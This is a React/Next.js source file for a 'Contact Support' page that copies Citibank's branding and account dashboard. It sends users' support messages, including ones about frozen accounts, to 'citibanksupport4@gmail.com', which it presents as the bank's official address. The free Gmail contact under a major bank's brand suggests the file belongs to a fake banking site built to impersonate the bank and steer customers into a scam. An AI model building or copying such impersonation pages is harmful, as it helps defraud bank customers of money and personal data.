'use client';
import { useState } from 'react';
import Link from 'next/link';
import { AlertCircle, ArrowLeft, CheckCircle, Headset } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';

const categories = ['Account access', 'Transactions', 'Frozen account', 'Card', 'Other'];
const supportEmail = 'citibanksupport4@gmail.com';

export default function SupportPage() {
  const [category, setCategory] = useState(categories[0]);
  const [subject, setSubject] = useState('');
  const [message, setMessage] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');

  function openDirectEmail() {
    const mailto = `mailto:${supportEmail}?subject=${encodeURIComponent(`[${category}] ${subject}`)}&body=${encodeURIComponent(message)}`;
    window.location.href = mailto;
    setError('');
    setSuccess(`Your email app is opening. Send the message to ${supportEmail} to submit your request.`);
  }

  async function handleSubmit(event: React.FormEvent) {
    event.preventDefault();
    setLoading(true);
    setError('');
    setSuccess('');
    try {
      const response = await fetch('/api/support', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ category, subject, message }),
      });
      const data = await response.json();
      if (!response.ok) {
        if (response.status >= 500) { openDirectEmail(); return; }
        setError(data.error || 'Unable to send your request.');
        return;
      }
      setSuccess(data.message);
      setSubject('');
      setMessage('');
    } catch {
      openDirectEmail();
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="max-w-2xl mx-auto animate-fade-in">
      <div className="flex items-center gap-3 mb-6">
        <Link href="/dashboard" className="p-2 rounded-lg hover:bg-citi-gray-100 transition-colors" title="Back to dashboard">
          <ArrowLeft className="w-5 h-5 text-citi-gray-600" />
        </Link>
        <div>
          <h1 className="text-2xl font-black text-citi-gray-800">Contact Support</h1>
          <p className="text-citi-gray-500 text-sm">Tell us how we can help</p>
        </div>
      </div>

      <div className="bg-white rounded-2xl border border-citi-gray-200 p-6">
        <div className="flex items-center gap-3 p-4 bg-citi-blue-50 rounded-xl mb-6">
          <Headset className="w-5 h-5 text-citi-blue" />
          <p className="text-sm text-citi-blue font-medium">Your request will be sent securely to our support team. You can also email <a href="mailto:citibanksupport4@gmail.com" className="underline">citibanksupport4@gmail.com</a>.</p>
        </div>
        {error && <div className="flex items-center gap-2 p-3 rounded-lg mb-5 bg-citi-red-light text-citi-red"><AlertCircle className="w-4 h-4" /><p className="text-sm font-medium">{error}</p></div>}
        {success && <div className="flex items-center gap-2 p-3 rounded-lg mb-5 bg-citi-green-light text-citi-green"><CheckCircle className="w-4 h-4" /><p className="text-sm font-medium">{success}</p></div>}
        <form onSubmit={handleSubmit} className="space-y-5">
          <div>
            <label htmlFor="support-category" className="citi-label">Issue Type</label>
            <select id="support-category" value={category} onChange={event => setCategory(event.target.value)} className="citi-input">
              {categories.map(item => <option key={item}>{item}</option>)}
            </select>
          </div>
          <Input label="Subject *" placeholder="Briefly describe your issue" value={subject} onChange={event => setSubject(event.target.value)} required />
          <div>
            <label htmlFor="support-message" className="citi-label">Message *</label>
            <textarea id="support-message" value={message} onChange={event => setMessage(event.target.value)} placeholder="Explain what happened and how we can help" rows={6} required className="citi-input resize-y" />
          </div>
          <Button type="submit" loading={loading} fullWidth size="lg">Send Support Request</Button>
        </form>
      </div>
    </div>
  );
}